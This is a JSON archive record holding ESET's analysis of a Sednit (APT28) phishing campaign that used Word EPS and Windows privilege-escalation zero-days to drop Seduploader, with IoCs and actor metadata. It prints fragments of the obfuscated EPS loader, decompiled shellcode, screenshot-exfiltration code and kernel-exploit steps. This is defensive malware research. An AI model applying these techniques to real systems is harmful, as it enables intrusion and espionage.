{
    "id": "cd068981-db6c-4e99-8ac6-dead937b76ac",
    "created_at": "2023-01-12T15:07:36.745323Z",
    "updated_at": "2025-03-27T02:17:11.805605Z",
    "deleted_at": null,
    "sha1_hash": "b28282399c81df4a85cba432db0b9f579273e6d7",
    "title": "2017-05-09 - Sednit adds two zero‑day exploits using ‘Trump’s attack on Syria’ as a decoy",
    "authors": "",
    "file_creation_date": "2022-05-28T18:06:00Z",
    "file_modification_date": "2022-05-28T18:06:00Z",
    "file_size": 1501211,
    "plain_text": "# Sednit adds two zero‑day exploits using ‘Trump’s attack on Syria’ as a decoy\n\n**[welivesecurity.com/2017/05/09/sednit-adds-two-zero-day-exploits-using-trumps-attack-syria-decoy/](https://www.welivesecurity.com/2017/05/09/sednit-adds-two-zero-day-exploits-using-trumps-attack-syria-decoy/)**\n\nMay 9, 2017\n\nSednit is back - this time with two more zero-day exploits embedded in a phishing email titled\nTrump's_Attack_on_Syria_English.docx.\n\n[ESET Research](https://www.welivesecurity.com/author/esetresearch/)\n9 May 2017 - 08:00PM\n\nSednit is back – this time with two more zero-day exploits embedded in a phishing email titled\nTrump’s_Attack_on_Syria_English.docx.\n\n## Introduction\n\nThe Sednit group, also known as APT28, Fancy Bear and Sofacy, is a group of attackers operating since at least\n2004 and whose main objective is to steal confidential information from specific targets. In October 2016, ESET\n[published an extensive analysis of Sednit’s arsenal and tactics in a whitepaper titled En Route with Sednit.](https://www.welivesecurity.com/2016/10/20/new-eset-research-paper-puts-sednit-under-the-microscope/)\n\n[Last month, Sednit came in the light again, allegedly interfering with the French elections and more precisely](https://motherboard.vice.com/en_us/article/evidence-linking-russian-hackers-fancy-bear-to-macron-phishing)\ngoing after the frontrunner Emmanuel Macron. In the same time period, a phishing email containing an\nattachment named Trump’s_Attack_on_Syria_English.docx caught our attention.\n\n\n-----\n\nAnalysis of the document revealed its end goal: dropping Sednit s well known reconnaissance tool, Seduploader.\nTo achieve this, Sednit used two zero-day exploits: one for a Remote Code Execution vulnerability in Microsoft\nWord (CVE-2017-0262) and one for a Local Privilege Escalation in Windows (CVE-2017-0263). ESET reported\nboth vulnerabilities to Microsoft, who today released patches during the regular Patch Tuesday schedule.\n\nThis blogpost describes the attack itself and the vulnerabilities used to infect its potential targets.\n\n## From a Word exploit to Seduploader Dropper\n\nThe graphic below shows that this specific attack is totally in line with Sednit’s usual attack methods: the use of a\nspearphishing email containing a malicious attachment to install a known first-stage payload.\n\nThis time, the phishing email was related to Trump’s attack on Syria.\n\n\n-----\n\nThe infected attachment is a decoy document containing a verbatim copy of an article titled “Trump’s Attack on\n_[Syria: Wrong for so Many Reasons” published on April 12, 2017 in The California Courier:](http://www.thecaliforniacourier.com/trumps-attack-on-syria-wrong-for-so-many-reasons/)_\n\n\n-----\n\nThis is where the attack becomes interesting. The decoy document contains two exploits allowing the installation\nof Seduploader. See the schema below for an overview.\n\nThese two exploits can be added to the list of zero-day vulnerabilities used by Sednit over the last 2 years, as\nshown in this timeline:\n\n\n-----\n\nOnce opened, the decoy document first triggers CVE-2017-0262, a vulnerability in the EPS filter in Microsoft\nOffice. In this case, the malicious EPS file is called image1.eps within the .docx file:\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n1\n\n2\n\n\n$ file Trump\\'s_Attack_on_Syria_English.docx\n\nTrump's_Attack_on_Syria_English.docx: Zip archive data, at least v2.0 to extrac2\n\n$ unzip Trump\\'s_Attack_on_Syria_English.docx\n\nArchive: Trump’s_Attack_on_Syria_English.docx\n\ninflating: [Content_Types].xml\n\ninflating: docProps/app.xml\n\ninflating: docProps/core.xml\n\ninflating: word/document.xml\n\ninflating: word/fontTable.xml\n\ninflating: word/settings.xml\n\ninflating: word/styles.xml\n\ninflating: word/webSettings.xml\n\ninflating: word/media/image1.eps\n\ninflating: word/theme/theme1.xml\n\ninflating: word/_rels/document.xml.rels\n\ninflating: _rels/.rels\n\n$ file word/media/image1.eps\n\nword/media/image1.eps: PostScript document text conforming DSC level 3.0\n\n\nThe EPS exploit file is obfuscated by a simple XOR. EPS provides the functionality to XOR variables and evaluate\nsource (exec). The key used here is 0xc45d6491 on a big hex-encoded string and exec is called on the decrypted\nbuffer.\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n\n$ cat word/media/image1.eps\n\n%!PS-Adobe-3.0\n\n%%BoundingBox:  36  36 576 756\n\n%%Page: 1 1\n\n/A3{ token pop exch pop } def /A2 def /A4{ /A1 exch def 0 1 A1 length 1 sub { /A5 exch def A1 A5 2 copy\nget A2 A5 4 mod get xor put } for A1 } def <bf7d4bd9[...]b97d44b1> A4 A3 exec quit\n\n\n[Once decrypted, the exploit looks very similar to the one which was well documented by FireEye in 2015. The](https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/twoforonefinal.pdf)\nvulnerability used at the time was CVE-2015-2545. The main difference is highlighted in the following block, which\nis how it performs the memory corruption with the forall instruction.\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n\n\n[...]\n\n500 {\n\nA31 589567 string copy pop\n\n} repeat\n\n1 array 226545696 forall\n\n/A19 exch def\n\n[...]\n\n\nOnce code execution is obtained, it loads a shellcode that retrieves some undocumented Windows APIs such as\nNtAllocateVirtualMemory, NtFreeVirtualMemory and ZwProtectVirtualMemory\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n21\n\n22\n\n23\n\n24\n\n\n\n[...]\n\nv1 = (*(__readfsdword(0x30u) + 12) + 12);\n\nv2 = v1-&gt;InLoadOrderModuleList.Flink;\n\n[...]\n\nfor ( addr_user32 = 0; v2 != v1; v135 = v2 )\n\n{\n\nv3 = *(v2 + 48);\n\nv132 = *(v2 + 44);\n\nif ( v3 )\n\n{\n\nv4 = *v3;\n\nv5 = 0;\n\nv6 = 0;\n\nif ( *v3 )\n\n{\n\ndo\n\n{\n\nif ( v132 &amp;&amp; v6 &gt;= v132 )\n\nbreak;\n\nif ( (v4 - 0x41) &lt;= 0x19u )\n\nv4 += 0x20;\n\nv2 = v135;\n\nv7 = __ROL4__(v5, 7);\n\n++v3;\n\n\n-----\n\n25\n\n26\n\n27\n\n28\n\n29\n\n30\n\n31\n\n32\n\n33\n\n34\n\n35\n\n36\n\n37\n\n38\n\n39\n\n40\n\n41\n\n42\n\n43\n\n44\n\n45\n\n\nv5 v4 v7;\n\nv4 = *v3;\n\n++v6;\n\n}\n\nwhile ( *v3 );\n\nv1 = v133;\n\n}\n\nswitch ( v5 )\n\n{\n\ncase kernel32:\n\naddr_kernel32 = *(v2 + 24);\n\nbreak;\n\ncase ntdll:\n\naddr_ntdll = *(v2 + 24);\n\nbreak;\n\ncase user32:\n\naddr_user32 = *(v2 + 24);\n\nbreak;\n\n}\n\n}\n\n[...]\n\n\nAfter more decryption, the Seduploader Dropper is then loaded and executed. Note that all this execution\nhappens within the WINWORD.EXE process running with the current user’s privileges.\n\n## Seduploader Dropper\n\nSeduploader is made up of two distinct components: a dropper and a persistent payload (see page 27 of our En\nRoute with Sednit whitepaper).\n\nWhile the dropper used in this attack has evolved since the last version we analyzed, its end goal remains the\nsame: to deliver the [Seduploader Payload. This new version of the dropper now contains code to integrate the](https://www.welivesecurity.com/2016/10/25/lifting-lid-sednit-closer-look-software-uses/)\nLPE exploit for CVE-2017-2063. The detailed analysis of this vulnerability can be found in the next section of the\nblog; for now, we will focus on Seduploader.\n\nFirst, the new code in the dropper checks if the process is running on a 32-bit or 64-bit version of Windows.\nDepending of the result, the correct exploit version will be loaded in memory.\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n\n\n[...]\n\nif ( Is64Process() == 1 )\n\n{\n\naddr_exploit = exploit_64b;\n\nsize_exploit = 0x2E00;\n\n}\n\nelse\n\n{\n\naddr_exploit = exploit_32b;\n\nsize_exploit = 0x2400;\n\n}\n\n[...]\n\n\nOnce the exploit is successfully executed, Seduploader Dropper will reload itself in WINWORD’s memory space\nand call CreateRemoteThread with the address of the UpLoader entry point, which will execute the code in charge\nof installing the Seduploader Payload. This code will run with System privileges, thanks to the exploit.\n\n## Seduploader Payload\n\nSeduploader Payload is a downloader used by Sednit’s operators as reconnaissance malware and is composed\nof two parts. The first is responsible for injecting the second part in the proper process, depending on whether it is\nloaded in the WINWORD.EXE process or not. The second part is the downloader itself.\n\nIf Seduploader is running in WINWORD.EXE, its first part will create a mutex named flPGdvyhPykxGvhDOAZnU\nand open a handle to the current process. That handle will be used to allocate memory and write in it the code of\nthe second part of the Payload component, which will then be executed by a call to CreateRemoteThread.\nOtherwise, if it is not running in WINWORD.EXE, Seduploader will use CreateThread to launch its second part.\n\nThe downloader contains the usual Seduploader functions and strings encryption algorithm. However, it contains\na certain number of changes that we describe below.\n\nFirst, the hashing algorithm used to identify DLL names and API functions to resolve was replaced by a new one.\nThe attentive readers of our whitepaper will recall that the old hashing algorithm was strongly inspired from code\nfound in Carberp. Well, the new algorithm was also not created from scratch: this time, Sednit used code very\n[similar to PowerSniff.](http://researchcenter.paloaltonetworks.com/2016/03/powersniff-malware-used-in-macro-based-attacks/)\n\nNext, a new img tag was added in Seduploader’s report message. This tag allows the exfiltration of screenshots:\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n\n\n[...]\n\nkeybd_event(VK_SNAPSHOT, 0x45u, KEYEVENTF_EXTENDEDKEY, 0u);\n\nSleep(1000u);\n\nkeybd_event(VK_SNAPSHOT, 0x45u, KEYEVENTF_EXTENDEDKEY|KEYEVENTF_KEYUP, 0u);\n\nOpenClipboard(0u);\n\nhData = GetClipboardData(CF BITMAP);\n\n\n-----\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n21\n\n22\n\n23\n\n24\n\n25\n\n26\n\n27\n\n28\n\n29\n\n30\n\n31\n\n32\n\n33\n\n34\n\n35\n\n\nCloseClipboard();\n\nif ( !hData )\n\nreturn 0;\n\nGdiplusStartupInput = (const int *)1;\n\nv10 = 0;\n\nv11 = 0;\n\nv12 = 0;\n\nGdiplusStartup(&token, &GdiplusStartupInput, 0);\n\nif ( fGetEncoderClsid((int)L\"image/jpeg\", &imageCLSID) )\n\n{\n\nv4 = sub_10003C5F((int)hData, 0);\n\nppstm = 0;\n\nCreateStreamOnHGlobal(0u, 1u, &ppstm);\n\nv5 = GdipSaveImageToStream(v4[1], ppstm, &imageCLSID, 0);\n\nif ( v5 )\n\nv4[2] = v5;\n\n(*(void (__thiscall **)(_DWORD *, signed int))*v4)(v4, 1);\n\nIStream_Size(ppstm, &pui);\n\ncb = pui.s.LowPart;\n\nv7 = ppstm;\n\n*a1 = pui.s.LowPart;\n\nIStream_Reset(v7);\n\nv1 = j_HeapAlloc(cb);\n\nIStream_Read(ppstm, v1, cb);\n\nppstm->lpVtbl->Release(ppstm);\n\n}\n\nGdiplusShutdown(token);\n\nreturn v1;\n\n}\n\n\nAs usual, Sednit operators did not reinvent the wheel. We found some similarities between their implementation of\n[the screenshot function and code available on stackoverflow. Instead of using GetForegroundWindow to retrieve](http://stackoverflow.com/questions/997175/how-can-i-take-a-screenshot-and-save-it-as-jpeg-on-windows)\na handle on the foreground window in which the user is currently working, Sednit chose to use keybd_event to\nsend a “Print screen” keystroke and then retrieve the image from the clipboard.\n\nThe image is then base64-encoded and added to the report, whose structure now looks like this:\n\n\n-----\n\n**Tag** **Value**\n\nid= Hard drive serial number*\n\nw= Process list\n\n_None_ NICs information\n\ndisk= register key**\n\nbuild= 4 bytes\n\ninject optional field***\n\nimg= screenshot encoded in base64\n\n- result of “import win32api;print hex(win32api.GetVolumeInformation(“C:\\\\”)[1])”\n** content of HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum\n*** toggled if SEDUPLOADER uses injection into a browser to connect to Internet\n\nScreenshotting was used before by Sednit. In the past, the feature was built in a separate, standalone tool often\ninvoked by Xtunnel at a later infection stage (see page 77 of our whitepaper), but it is now built in Seduploader for\nuse at the reconnaissance phase.\n\nFinally, on the config side, two new functions were added: shell and LoadLib. The shell config allows the attacker\nto execute arbitrary code directly in-memory. The LoadLib is a bit field that allows running an arbitrary DLL by\ncalling rundll32.exe\n\n## CVE-2017-0263 – Local privilege escalation\n\n Exploit Workflow\n\nAs mentioned before, in order to deploy Seduploader Payload, Seduploader Dropper gains System privileges by\nexploiting CVE-2017-0263, an LPE vulnerability. In this section, we will describe how this vulnerability is exploited\nby Sednit.\n\nFirst, even though the vulnerability affects Windows 7 and above (see at the end of this post for the full list of\naffected platforms), the exploit is designed to avoid running on Windows version 8.1 and above.\n\nSince the exploit can target both 32-bit and 64-bit platforms, it will first determine if the process is running under\nWOW64. The exploit will allocate multiple pages, until it reaches a high address (0x02010000). It will then build\nthe following structure:\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n\nstruct Payload\n\n{\n\nLONG PTEAddress;        // Points to the PTE entry containing the physical address of the page\ncontaining our structure. Only used for windows 8+\n\nLONG pid;           // Injected process pid;\n\nLONG offset_of_lpszMenuName;  // Offset of the lpszMenuName in the win32k!tagCLS structure\n\nLONG offset_of_tagTHREADINFO; // Offset of the pti field in the win32k!tagWND structure.\n\nLONG offset_of_tagPROCESSINFO; // Offset of the ppi field in the win32k!tagTHREADINFO structure.\n\nLONG offset_of_TOKEN;     // Offset of the Token field in the nt!_EPROCESS structure.\n\nLONG tagCLS[0x100];      // Array containing the tagCLS of the created windows.\n\nLONG WndProcCode;       // Code of the WndProc meant to be run in kernel mode.\n\n};\n\n\nThen, it will retrieve the address of HMValidateHandle. This function allows the attacker to leak the kernel address\nof a tagWND object.\n\nHere is an overview of how the rest of the exploit works:\n\nThe exploit will create 256 random window classes and their associated windows. Each window will have 512\nbytes of extra memory. This extra memory is contiguous to the tagWND object in the kernel space. After the first\ncreated window i e in the extra memory the exploit will build a fake object containing mostly only its own address\n\n\n-----\n\nfor later use, as shown in the picture:\n\nWhen all the windows are created, the exploit will allocate 2 additional windows. The purpose of first one is to be\nexecuted in a kernel thread: let’s call this window KernelWnd, and the other one will mainly receive all the\nnecessary messages needed for the exploit to complete; let’s call this window TargetWindow. Then, the exploit\nassociates this procedure with the newly allocated object, KernelWnd.\n\n_// …_\nTargetWindow = CreateWindowExW(0x80088u, MainWindowClass, 0, WS_VISIBLE, 0, 0, 1, 1, 0, 0, hModuleSelf,\n0);\nKernelWnd = CreateWindowExW(0, MainWindowClass, 0, 0, 0, 0, 1, 1, 0, 0, hModuleSelf, 0);\n_// …_\nSetWindowLongW(KernelWnd, GWL_WNDPROC, (LONG)Payload_0->WndProc);\n\nLet’s add some context around the behavior of the win32k component. Every time you create a new window\nthrough CreateWindowExW, the driver will allocate a new tagWND object in the kernel. The object can be\ndescribed like this (some fields are removed for clarity’s sake):\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n\nkd> dt tagWND\n\nwin32k!tagWND\n\n+0x000 head       : _THRDESKHEAD\n\n+0x028 state      : Uint4B\n\n// ...\n\n+0x028 bServerSideWindowProc : Pos 18, 1 Bit\n\n// ...\n\n+0x042 fnid       : Uint2B\n\n+0x048 spwndNext    : Ptr64 tagWND\n\n+0x050 spwndPrev    : Ptr64 tagWND\n\n+0x058 spwndParent   : Ptr64 tagWND\n\n+0x060 spwndChild    : Ptr64 tagWND\n\n+0x068 spwndOwner    : Ptr64 tagWND\n\n+0x070 rcWindow     : tagRECT\n\n+0x080 rcClient     : tagRECT\n\n+0x090 lpfnWndProc   : Ptr64   int64\n\n+0x098 pcls       : Ptr64 tagCLS\n\n// ...\n\n\nAs you can see, the tagWND->lpfnWindowProc contains the address of the procedure associated with this\nwindow. The driver usually lowers its privileges in order to execute this procedure in the user’s context. This\nbehavior is controlled by the bit tagWND->bServerSideProc. If this bit is set, then the procedure will be run with\nelevated privileges, i.e in the kernel. The exploit works by flipping the tagWND->bServerSideProc bit. All the\nattacker needs to do is to find a way of flipping that bit.\n\nDuring the destruction of the menus, the hook set up before will check if the class of the object is SysShadow as\nshown on the next code block. If that’s the case, it will replace the associated procedure with its own.\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n\nGetClassNameW(tagCWPSTRUCT->hwnd, &ClassName, 20);\n\nif ( !wcscmp(&ClassName, STR_SysShadow) )\n\n{\n\nif ( ++MenuIndex == 3 )\n\n{\n\n// tagWND\n\n::wParam = *(_DWORD *)(FN_LeakHandle((int)hWnd[0]) + sizeof_tagWND_0);\n\n// Replace the WndProc of the object\n\nSetWindowLongW(tagCWPSTRUCT->hwnd, GWL_WNDPROC, (LONG)FN_TriggerExploit);\n\n}\n\n\nIn this procedure, we can see that the exploit looks for the WM_NCDESTROY message. If the requirements are\nmet, it will build a malicious tagPOPUPMENU object which is described by the following pseudocode:\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n\nif ( Msg == WM_NCDESTROY )\n\n{\n\nstruct tagPOPUPMENU *pm = BuildFakeObject();\n\nSetClassLongW(..., pm);\n\n}\n\n\nNote that the address used to build this object is within the extra memory allocated at the end of our first tagWND.\nThen, the exploit calls NtUserMNDragLeave, in order to flip the bServerSideProc bit of our KernelWnd object. To\ndo so, the function will retrieve a tagMENUSTATE object using the structure tagTHREADINFO.\nThe tagMENUSTATE object contains the address of the menu object being destroyed (tagMENUSTATE>pGlobalPopupMenu).\n\n\n-----\n\nAs you can see, the tagPOPUPMENU is the malicious object we crafted in user space before\ncalling NtUserMNDragLeave. Looking at the fields in the malicious tagPOPUPMENU, we can see that they all\npoints in the extra memory except one, which points into our KernelWnd object.\n\nFrom here, the execution will reach the function MNFreePopup, which takes a pointer to\na tagPOPUPMENU object. Eventually this function will call HMAssignmentUnlock, passing the\nfields spwndNextPopup and spwndPrevPopup as argument:\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n\n; win32k!HMAssignmentUnlock\n\nrsp,28h\n\nmov   rdx,qword ptr [rcx]\n\nand   qword ptr [rcx],0\n\ntest  rdx,rdx\n\nje   win32k!HMAssignmentUnlock+0x4f (fffff960`00119adf)\n\nadd   dword ptr [rdx+8],0FFFFFFFFh; Flipping bServerSideProc\n\njne   win32k!HMAssignmentUnlock+0x4f (fffff960`00119adf)\n\nmovzx  eax,word ptr [rdx]\n\n\nAfter the execution of the syscall, our tagWND structure associated with our KernelWnd looks like this:\n\n\n-----\n\nEverything is set! The exploit just needs to send the right message in order to trigger the execution of our\nprocedure in kernel mode.\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n\nsyscall(NtUserMNDragLeave, 0, 0);\n\n// Send a message to the procedure in order to trigger its execution in kernel mode.\n\nKernelCallbackResult = SendMessageW(KernelWnd, 0x9F9Fu, ::wParam, 0);\n\nStatus.Triggered = KernelCallbackResult == 0x9F9F;\n\nif ( KernelCallbackResult != 0x9F9F )\n\n// Error, try again.\n\nPostMessageW(TargetWindow, 0xABCDu, 0, 0);\n\n\nFinally, the window procedure running with elevated privileges will steal the SYSTEM token and add it to the\ncalling process. After successfully running the exploit, FLTLDR.EXE should run with SYSTEM privileges, and will\ninstall Seduploader’s payload\n\n## Summary\n\nThis campaign shows us that Sednit has not ceased its activities. They still keep their old habits: using known\nattack methods, reusing code from other malware or public websites, and making small mistakes such as typos in\nSeduploader’s configuration (shel instead of shell).\n\nAlso usual is the fact that they once again improved their toolset, this time adding some built-in features such as\nthe screenshotter and integrating two new zero-day exploits into their arsenal.\n\n\n-----\n\n## Platforms affected by CVE-2017-0262 and CVE-2017-0263 (according to Microsoft)\n\n### CVE-2017-0262\n\nMicrosoft Office 2010 Service Pack 2 (32-bit editions)\nMicrosoft Office 2010 Service Pack 2 (64-bit editions)\nMicrosoft Office 2013 Service Pack 1 (32-bit editions)\nMicrosoft Office 2013 Service Pack 1 (64-bit editions)\nMicrosoft Office 2013 RT Service Pack 1\nMicrosoft Office 2016 (32-bit edition)\nMicrosoft Office 2016 (64-bit edition)\n\n[Microsoft advises all customers to follow the guidance in security advisory ADV170005 as a defense-in-depth](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/ADV170005)\nmeasure against EPS filter vulnerabilities.\n\n### CVE-2017-0263\n\nWindows 7 for 32-bit Systems Service Pack 1\nWindows 7 for x64-based Systems Service Pack 1\nWindows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)\nWindows Server 2008 R2 for Itanium-Based Systems Service Pack 1\nWindows Server 2008 R2 for x64-based Systems Service Pack 1\nWindows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)\nWindows Server 2012\nWindows Server 2012 (Server Core installation)\nWindows 8.1 for 32-bit systems\nWindows 8.1 for x64-based systems\nWindows Server 2012 R2\nWindows RT 8.1\nWindows Server 2012 R2 (Server Core installation)\nWindows 10 for 32-bit Systems\nWindows 10 for x64-based Systems\nWindows 10 Version 1511 for x64-based Systems\nWindows 10 Version 1511 for 32-bit Systems\nWindows Server 2016\nWindows 10 Version 1607 for 32-bit Systems\nWindows 10 Version 1607 for x64-based Systems\nWindows Server 2016 (Server Core installation)\nWindows 10 Version 1703 for 32-bit Systems\nWindows 10 Version 1703 for x64-based Systems\nWindows Server 2008 for Itanium-Based Systems Service Pack 2\nWindows Server 2008 for 32-bit Systems Service Pack 2\nWindows Server 2008 for x64-based Systems Service Pack 2<\nWindows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)\n\n## IoCs\n\n[Also available on ESET’s Github.](https://github.com/eset/malware-ioc/blob/master/sednit/2017-05-09_Trump_Attack_on_Syria_IoCs.adoc)\n\n**SHA-1** **Filename** **ESET detection name**\n\n`d5235d136cfcadbef431eea7253d80bde414db9d` Trump's_Attack_on_Syria_English.docx Win32/Exploit.Agent.NWZ\n\n`18b7dd3917231d7bae93c11f915e9702aa5d1bbb` image1.eps Win32/Exploit.Agent.NWZ\n\n\n-----\n\n**SHA-1** **Filename** **ESET detection name**\n\n`6a90e0b5ec9970a9f443a7d52eee4c16f17fcc70` joiner.dll Win32/Exploit.Agent.NWV\n\n`e338d49c270baf64363879e5eecb8fa6bdde8ad9` apisecconnect.dll Win32/Sednit.BG\n\n## Mutex\n\n1 flPGdvyhPykxGvhDOAZnU\n\n## Registry key\n\n1 HKCU\\Software\\Microsoft\\Office test\\Special\\Perf\n\n9 May 2017 - 08:00PM\n\n### Sign up to receive an email update whenever a new article is published in our Ukraine Crisis – Digital Security Resource Center\n\n Newsletter\n\n Discussion\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-05-09 - Sednit adds two zero‑day exploits using ‘Trump’s attack on Syria’ as a decoy.pdf"
    ],
    "report_names": [
        "2017-05-09 - Sednit adds two zero‑day exploits using ‘Trump’s attack on Syria’ as a decoy.pdf"
    ],
    "threat_actors": [
        {
            "id": "e3767160-695d-4360-8b2e-d5274db3f7cd",
            "created_at": "2022-10-25T16:47:55.914348Z",
            "updated_at": "2025-03-27T02:05:17.411172Z",
            "deleted_at": null,
            "main_name": "IRON TWILIGHT",
            "aliases": [
                "ATK5 ",
                "Blue Athena ",
                "BlueDelta ",
                "FROZENLAKE ",
                "Fancy Bear ",
                "Fighting Ursa ",
                "Forest Blizzard ",
                "GRAPHITE ",
                "Group 74 ",
                "PawnStorm ",
                "STRONTIUM ",
                "Sednit ",
                "Snakemackerel ",
                "Sofacy ",
                "TG-4127 ",
                "Tsar Team ",
                "APT28 "
            ],
            "source_name": "Secureworks:IRON TWILIGHT",
            "tools": [
                " Downdelph",
                " Drovorub",
                " EVILTOSS",
                " HIDEDRV",
                " Headlace",
                " LoJack",
                " Powershell Empire",
                " SCONATO",
                " SEDUPLOADER",
                " SHARPFRONT",
                " Scaramouche",
                " Sedkit Exploit Kit",
                " Sofacy downloader",
                " X-Agent",
                " X-Tunnel",
                " Zebrocy",
                " reGeorg",
                "DEALERSCHOICE"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "730dfa6e-572d-473c-9267-ea1597d1a42b",
            "created_at": "2023-01-06T13:46:38.389985Z",
            "updated_at": "2025-03-27T02:00:02.821388Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "FROZENLAKE",
                "BlueDelta",
                "SNAKEMACKEREL",
                "TG-4127",
                "ITG05",
                "TA422",
                "Fancy Bear",
                "FANCY BEAR",
                "Sednit",
                "IRON TWILIGHT",
                "G0007",
                "Sofacy",
                "Forest Blizzard",
                "GruesomeLarch",
                "Pawn Storm",
                "Tsar Team",
                "STRONTIUM",
                "ATK5",
                "Blue Athena",
                "APT-C-20",
                "Group 74",
                "SIG40",
                "Grizzly Steppe",
                "Fighting Ursa",
                "T-APT-12",
                "UAC-0028"
            ],
            "source_name": "MISPGALAXY:APT28",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ae320ed7-9a63-42ed-944b-44ada7313495",
            "created_at": "2022-10-25T15:50:23.671663Z",
            "updated_at": "2025-03-27T02:00:55.518748Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "APT28",
                "IRON TWILIGHT",
                "SNAKEMACKEREL",
                "Group 74",
                "Sednit",
                "Sofacy",
                "Pawn Storm",
                "Fancy Bear",
                "STRONTIUM",
                "Tsar Team",
                "Threat Group-4127",
                "TG-4127",
                "Forest Blizzard",
                "FROZENLAKE"
            ],
            "source_name": "MITRE:APT28",
            "tools": [
                "Wevtutil",
                "certutil",
                "Forfiles",
                "DealersChoice",
                "Mimikatz",
                "ADVSTORESHELL",
                "Komplex",
                "HIDEDRV",
                "JHUHUGIT",
                "Koadic",
                "Winexe",
                "XTunnel",
                "Drovorub",
                "CORESHELL",
                "OLDBAIT",
                "Downdelph",
                "XAgentOSX",
                "USBStealer",
                "Zebrocy",
                "Fysbis",
                "LoJax"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d2516b8e-e74f-490d-8a15-43ad6763c7ab",
            "created_at": "2022-10-25T16:07:24.212584Z",
            "updated_at": "2025-03-27T02:02:10.141001Z",
            "deleted_at": null,
            "main_name": "Sofacy",
            "aliases": [
                "APT 28",
                "ATK 5",
                "Blue Athena",
                "BlueDelta",
                "FROZENLAKE",
                "Fancy Bear",
                "Fighting Ursa",
                "Forest Blizzard",
                "Grey-Cloud",
                "Grizzly Steppe",
                "Group 74",
                "GruesomeLarch",
                "ITG05",
                "Iron Twilight",
                "Operation DealersChoice",
                "Operation Dear Joohn",
                "Operation Komplex",
                "Operation Pawn Storm",
                "Operation Russian Doll",
                "Operation Steal-It",
                "Pawn Storm",
                "SIG40",
                "Sednit",
                "Snakemackerel",
                "Sofacy",
                "Strontium",
                "T-APT-12",
                "TA422",
                "TAG-0700",
                "TAG-110",
                "TG-4127",
                "Tsar Team",
                "UAC-0028",
                "UAC-0063"
            ],
            "source_name": "ETDA:Sofacy",
            "tools": [
                "ADVSTORESHELL",
                "AZZY",
                "Backdoor.SofacyX",
                "CHERRYSPY",
                "CORESHELL",
                "Carberp",
                "Computrace",
                "DealersChoice",
                "Delphacy",
                "Downdelph",
                "Downrage",
                "Drovorub",
                "EVILTOSS",
                "Foozer",
                "GAMEFISH",
                "GooseEgg",
                "Graphite",
                "HATVIBE",
                "HIDEDRV",
                "Headlace",
                "Impacket",
                "JHUHUGIT",
                "JKEYSKW",
                "Koadic",
                "Komplex",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "LoJack",
                "LoJax",
                "MASEPIE",
                "Mimikatz",
                "NETUI",
                "Nimcy",
                "OCEANMAP",
                "OLDBAIT",
                "PocoDown",
                "PocoDownloader",
                "Popr-d30",
                "ProcDump",
                "PythocyDbg",
                "SMBExec",
                "SOURFACE",
                "SPLM",
                "STEELHOOK",
                "Sasfis",
                "Sedkit",
                "Sednit",
                "Sedreco",
                "Seduploader",
                "Shunnael",
                "SkinnyBoy",
                "Sofacy",
                "SofacyCarberp",
                "SpiderLabs Responder",
                "Trojan.Shunnael",
                "Trojan.Sofacy",
                "USB Stealer",
                "USBStealer",
                "VPNFilter",
                "Win32/USBStealer",
                "WinIDS",
                "Winexe",
                "X-Agent",
                "X-Tunnel",
                "XAPS",
                "XTunnel",
                "Xagent",
                "Zebrocy",
                "Zekapab",
                "carberplike",
                "certutil",
                "certutil.exe",
                "fysbis",
                "webhp"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536056,
    "ts_updated_at": 1743041831,
    "ts_creation_date": 1653761160,
    "ts_modification_date": 1653761160,
    "files": {
        "pdf": "https://archive.orkl.eu/b28282399c81df4a85cba432db0b9f579273e6d7.pdf",
        "text": "https://archive.orkl.eu/b28282399c81df4a85cba432db0b9f579273e6d7.txt",
